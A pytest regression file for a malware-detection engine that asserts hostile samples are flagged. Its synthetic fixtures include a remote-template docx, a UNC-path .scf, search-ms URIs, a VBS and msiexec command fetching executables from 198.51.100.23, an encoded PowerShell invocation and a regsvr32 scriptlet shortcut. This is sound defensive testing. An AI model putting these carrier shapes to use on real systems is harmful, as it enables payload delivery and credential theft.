"""Regression tests for the 2026-11-24 accuracy fix wave 3
(external-reference closure, engine incompleteness invariant,
interpreter-proxy invocation). The deep research report
event-zero-no-clean-for-remote-payload-20261124 states the closure
rule: a file may receive NO only if every reference it makes to
content outside itself resolves to content examined in the same
run or to a provably inert target. Wave 2 closed three named
shapes; this wave implements the general rules behind them (R1,
R3, R5). Synthetic fixtures only, authored here; no sample was
downloaded. See validation/FIX-LOG-2026-11-24-WAVE3.md."""
import io
import os
import sys
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero.verdict import verdict, external_references, proxy_invocation_findings


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


def docx(tmp_path, name, rels_extra):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                   '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                   '<Default Extension="xml" ContentType="application/xml"/>'
                   '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
        z.writestr("word/document.xml",
                   '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
                   '<w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>')
        z.writestr("word/_rels/document.xml.rels",
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   + rels_extra + '</Relationships>')
    return write(tmp_path, name, buf.getvalue())


def unaccounted_text(v):
    return "\n".join(v["unaccounted"])


# ------------------------------------------------------------------
# R1: external-reference closure
# ------------------------------------------------------------------
RELS_TEMPLATE = ('<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                 'Target="https://198.51.100.23/template.dotm" TargetMode="External"/>')
RELS_BENIGN = ('<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
               'Target="https://example.com/articles/how-to-cook" TargetMode="External"/>'
               '<Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
               'Target="https://example.com/images/logo.png" TargetMode="External"/>')


def test_wave3_docx_external_template_blocks_no(tmp_path):
    # a document with zero macros and one external attachedTemplate
    # relationship is not a clean document; it is an unexamined
    # document plus an address (the template injection shape)
    v = verdict(docx(tmp_path, "report.docx", RELS_TEMPLATE))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    doc = v["files"][0]
    assert doc["verdict"] == "YES: UNACCOUNTED"
    assert "external-reference-unresolved" in unaccounted_text(v)
    refs = doc["external_references"]["references"]
    assert any(r["rel_type"] == "attachedTemplate" and r["disposition"] == "unresolved"
               for r in refs), refs


def test_wave3_docx_benign_external_relationships_still_no(tmp_path):
    # the benign twin: an external hyperlink to a plain https page
    # and an external image relationship are provably inert, so the
    # document keeps its NO and the references are recorded as inert
    v = verdict(docx(tmp_path, "notes.docx", RELS_BENIGN))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    refs = v["files"][0]["external_references"]["references"]
    assert refs and all(r["disposition"] == "inert" for r in refs), refs


def test_wave3_scf_unc_icon_blocks_no(tmp_path):
    # an .scf whose IconFile is a UNC path makes Explorer contact
    # and authenticate to that server when the folder is merely
    # viewed; the remote end was not examined
    scf = ("[Shell]\r\nCommand=2\r\n"
           "IconFile=\\\\198.51.100.23\\share\\icon.ico\r\n"
           "[Taskbar]\r\nCommand=ToggleDesktop\r\n")
    v = verdict(write(tmp_path, "view.scf", scf))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "external-reference-unresolved" in unaccounted_text(v)


def test_wave3_url_search_ms_blocks_no(tmp_path):
    # a protocol handler URI is operative by design: opening it
    # makes Explorer display remote content as if local
    url = "[InternetShortcut]\r\nURL=search-ms:query=invoice&crumb=location:\\\\198.51.100.23\\share\r\n"
    v = verdict(write(tmp_path, "search.url", url))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "external-reference-unresolved" in unaccounted_text(v)


def test_wave3_vbs_split_string_fetch_blocks_no(tmp_path):
    # adversarial variant: the fetch URL is assembled from split
    # string literals, so no literal scan sees it whole; static
    # de-concatenation recovers the reference, and the reference is
    # to an executable payload that was not examined
    vbs = ('Dim x, u\r\n'
           'u = "http" & "://198.51.100.23/p.exe"\r\n'
           'Set x = CreateObject("MSXML2.XMLHTTP")\r\n'
           'x.Open "GET", u, False\r\n'
           'x.Send\r\n')
    v = verdict(write(tmp_path, "drop.vbs", vbs))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "external-reference-unresolved" in unaccounted_text(v)
    refs = v["files"][0]["external_references"]["references"]
    assert any(r["target"] == "http://198.51.100.23/p.exe" and r["disposition"] == "unresolved"
               for r in refs), refs


def test_wave3_plain_vbs_still_no(tmp_path):
    v = verdict(write(tmp_path, "ok.vbs", 'MsgBox "hello"\r\n'))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


def test_wave3_clickonce_codebase_blocks_no(tmp_path):
    # a ClickOnce manifest is a subscription to future code: the
    # assemblies are downloaded at install and on update checks,
    # so the manifest alone can never be accounted clean
    app = ('<?xml version="1.0" encoding="utf-8"?>\r\n'
           '<asmv1:assembly xmlns:asmv1="urn:schemas-microsoft-com:asm.v1">\r\n'
           '<deployment xmlns="urn:schemas-microsoft-com:asm.v2">\r\n'
           '<deploymentProvider codebase="https://198.51.100.23/app/setup.application" />\r\n'
           '</deployment></asmv1:assembly>\r\n')
    v = verdict(write(tmp_path, "setup.application", app))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "external-reference-unresolved" in unaccounted_text(v)


PDF_URI_EVIL = (b"%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Link "
                b"/A << /S /URI /URI (http://198.51.100.23/p.exe) >> >>\n"
                b"endobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")
PDF_URI_BENIGN = (b"%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Link "
                  b"/A << /S /URI /URI (https://example.com/articles/how-to-cook) >> >>\n"
                  b"endobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")


def test_wave3_pdf_uri_executable_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "link.pdf", PDF_URI_EVIL))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "external-reference-unresolved" in unaccounted_text(v)


def test_wave3_pdf_uri_page_still_no(tmp_path):
    v = verdict(write(tmp_path, "link.pdf", PDF_URI_BENIGN))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


def test_wave3_protocol_uri_in_text_blocks_no(tmp_path):
    # the search-ms carrier in the published record is an HTML or
    # text attachment: the URI is operative wherever it appears
    txt = "Open the shared results here: search-ms:query=invoice&crumb=location:\\\\198.51.100.23\\share\n"
    v = verdict(write(tmp_path, "note.txt", txt))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "external-reference-unresolved" in unaccounted_text(v)


def test_wave3_plain_text_link_still_no(tmp_path):
    txt = "The manual lives at https://example.com/articles/how-to-cook for reference.\n"
    v = verdict(write(tmp_path, "note.txt", txt))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


# ------------------------------------------------------------------
# R5: interpreter-proxy invocation
# ------------------------------------------------------------------
CMD_ENC = ('@echo off\r\n'
           'powershell -EncodedCommand aQBmACAAKABwAHMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAJABudWxsACkA\r\n'
           'echo done\r\n')
CMD_MSIEXEC = '@echo off\r\nmsiexec /i https://198.51.100.23/setup.msi /quiet\r\n'
CMD_MENTION = ('@echo off\r\n'
               'rem Never run powershell -EncodedCommand from the internet, and never fetch https://example.com/x.exe by hand\r\n'
               'echo mshta and regsvr32 are signed system tools; this script only mentions them\r\n'
               'echo done\r\n')


def proxy_kinds(v):
    return [f["kind"] for f in v["files"][0].get("proxy_invocation_findings", [])]


def test_wave3_powershell_encoded_invocation_blocks_no(tmp_path):
    # no fetch anywhere: the proxy is aimed at encoded content, and
    # encoded content the run did not decode is unaccounted
    v = verdict(write(tmp_path, "run.cmd", CMD_ENC))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert proxy_kinds(v) == ["interpreter-proxy-invocation"]
    assert "interpreter-proxy-invocation" in unaccounted_text(v)


def test_wave3_msiexec_remote_package_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "install.cmd", CMD_MSIEXEC))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert proxy_kinds(v) == ["interpreter-proxy-invocation"]


def test_wave3_comment_and_mention_controls_still_no(tmp_path):
    # the benign-mention control: proxy names and even an encoded
    # invocation shape on a comment line, and proxy names in an
    # echo sentence, are mentions, not invocations
    v = verdict(write(tmp_path, "notes.cmd", CMD_MENTION))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("proxy_invocation_findings") is None
    assert proxy_invocation_findings("notes.cmd", CMD_MENTION.encode()) == []


def test_wave3_wscript_target_in_submission_still_no(tmp_path):
    # a legitimate invocation references a local, named file that
    # is in the submission and examined in the same run: resolved
    write(tmp_path, "helper.vbs", 'MsgBox "hello"\r\n', "fold")
    write(tmp_path, "launcher.cmd", '@echo off\r\nwscript helper.vbs\r\n', "fold")
    v = verdict(os.path.join(str(tmp_path), "fold"))
    assert v["headline"] == "NO: NO MALWARE", v["unaccounted"]


def test_wave3_wscript_missing_target_blocks_no(tmp_path):
    # the same invocation with the target absent: the invoked
    # content was not examined in this run, so it is unaccounted
    v = verdict(write(tmp_path, "solo.cmd", '@echo off\r\nwscript payload.vbs\r\n'))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert proxy_kinds(v) == ["interpreter-proxy-invocation"]


def _lnk_blob(invocation_ascii):
    blob = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 64
    blob += invocation_ascii.encode() + b"\x00"
    blob += b"\x00" * 32 + invocation_ascii.encode("utf-16-le") + b"\x00\x00"
    return blob


def test_wave3_lnk_regsvr32_unaccounted_target_blocks_no(tmp_path):
    # the Squiblydoo carrier shape: a shortcut aiming regsvr32 at
    # a scriptlet that is not part of the submission
    lnk = _lnk_blob("C:\\Windows\\System32\\regsvr32.exe /s /i:payload.sct scrobj.dll")
    v = verdict(write(tmp_path, "doc.pdf.lnk", lnk))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "interpreter-proxy-invocation" in unaccounted_text(v)


def test_wave3_lnk_local_program_still_no(tmp_path):
    lnk = _lnk_blob("C:\\Program Files\\Tools\\tool.exe")
    v = verdict(write(tmp_path, "tool.lnk", lnk))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


# ------------------------------------------------------------------
# R3: engine incompleteness invariant
# ------------------------------------------------------------------
def test_wave3_python_parse_error_blocks_no(tmp_path):
    # the analyzer records the parse failure and, before this wave,
    # the verdict never read it: a script the parser could not
    # parse was certified on the line ledger alone
    src = "x = 1\ndef broken(:\n    y = 2\nprint(x)\n"
    v = verdict(write(tmp_path, "broken.py", src))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "engine-incompleteness" in unaccounted_text(v)
    assert "script-parse-failure" in unaccounted_text(v)
    assert v["files"][0]["incompleteness"] == ["script-parse-failure"]


def test_wave3_valid_python_still_no(tmp_path):
    v = verdict(write(tmp_path, "ok.py", 'print("hello")\n'))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("incompleteness") is None


def test_wave3_reference_function_directly():
    refs, complete, _note = external_references(
        "x.url", b"[InternetShortcut]\r\nURL=search-ms:query=x\r\n")
    assert complete and refs and refs[0]["kind"] == "shortcut-target"
    refs, complete, _note = external_references(
        "x.txt", b"see https://example.com/articles/how-to-cook\n")
    assert refs == []
